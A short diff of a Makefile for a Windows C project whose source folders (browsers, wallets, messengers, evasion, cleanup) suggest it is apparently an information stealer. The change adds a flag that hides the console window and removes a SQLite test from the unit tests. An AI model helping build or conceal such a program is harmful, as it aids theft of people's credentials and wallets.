@@ -1,7 +1,7 @@
 CC = x86_64-w64-mingw32-gcc
 NASM = nasm
 CFLAGS = -Wall -Wextra -Wno-error -O2 -Iinclude -Isrc -Isrc/utils -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -Isrc/crypto -Isrc/evasion -Isrc/cleanup
-LDFLAGS = -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32 -lshell32 -lole32 -loleaut32 -lgdi32
+LDFLAGS = -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32 -lshell32 -lole32 -loleaut32 -lgdi32 -mwindows
 
 SRCS = src/main.c \
        src/types/peb.c \
@@ -90,7 +90,7 @@ test-hash: tests/test_hash.c src/types/hash.c include/hash.h include/config.h
 TEST_CC = gcc
 TEST_CFLAGS = -Wall -Wextra -O2 -Iinclude -Isrc/parsers -std=c11
 
-test-unit: test-crypto test-sqlite test-peb test-chromium test-wallets test-messengers test-network test-evasion
+test-unit: test-crypto test-peb test-chromium test-wallets test-messengers test-network test-evasion
 	@echo "=== ALL UNIT TESTS PASSED ==="
 
 test-crypto: tests/test_crypto.c src/crypto/chacha_poly.c
